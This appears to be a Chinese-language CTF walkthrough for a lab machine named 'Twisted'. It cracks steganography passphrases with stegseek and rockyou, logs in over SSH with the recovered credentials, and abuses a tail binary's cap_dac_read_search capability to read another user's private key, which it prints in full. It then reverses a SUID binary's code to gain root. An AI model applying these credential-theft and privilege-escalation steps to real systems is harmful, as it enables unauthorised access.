---
date: 2025-04-02
tags:
    - stegseek
    - capabilities提权
---



# Twisted

`fscan`扫描发现仅开放`80`和`2222`端口，访问网页

![](./img/Twisted-1.png)

发现给了两张猫的照片，`stegsolve`与或啥都不行，又试了盲水印,也不是，目录扫描也没有东西，看了wp才知道需要用[stegseek](https://github.com/RickdeJager/stegseek)

检测是否使用`steghide`进行编码

```bash
$ stegseek --seed cat-hidden.jpg
[i] Found (possible) seed: "841e4403"            
        Plain size: 47.0 Byte(s) (compressed)
        Encryption Algorithm: rijndael-128
        Encryption Mode:      cbc
```

爆破`hidden`解密

```bash
$ stegseek --crack cat-hidden.jpg  ~/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
[i] Found passphrase: "sexymama"
[i] Original filename: "mateo.txt".
[i] Extracting to "cat-hidden.jpg.out".

$cat cat-hidden.jpg.out
thisismypassword
```

爆破`original`解密

```bash
$ stegseek --crack cat-original.jpg  ~/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "westlife"
[i] Original filename: "markus.txt".
[i] Extracting to "cat-original.jpg.out".

$ cat cat-original.jpg.out
markuslovesbonita
```

整理一下最终账号密码为

```
mateo/thisismypassword
markus/markuslovesbonita
```

`ssh`连接

```bash
ssh -p 2222 mateo@192.168.1.66
```

![](./img/Twisted-2.png)

在`note.txt`发现内容为

```
/var/www/html/gogogo.wav
```

`markus`这里的`note.txt`师

```
Hi bonita,
I have saved your id_rsa here: /var/cache/apt/id_rsa
Nobody can find it.
```

在`bonita`用户这里找到`beroot`的`elf`文件，那么现在只要读去`bonita`用户的`id_rsa`来登录`bonita`用户再登录`root`即可，直接读取权限不够，尝试`suid`提权

```bash
markus@twisted:~$ find / -perm -4000 2>/dev/null
/home/bonita/beroot
/usr/bin/su
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
markus@twisted:~$ sudo -l
-bash: sudo: command not found
```

发现`suid`没找到，尝试`capabilities`提权

```bash
markus@twisted:~$ /usr/sbin/getcap / -r 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/tail = cap_dac_read_search+ep
```

发现`tail`，直接读文件

```bash
$ /usr/bin/tail -n 50 /var/cache/apt/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF
gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C
tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC
xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8
DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/
hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh
V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF
eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

用私钥登录，运行`beroot`，发现需要`code`，下载到`ida`查看一下

![](./img/Twisted-4.png)

`code`是`5880`

![](./img/Twisted-5.png)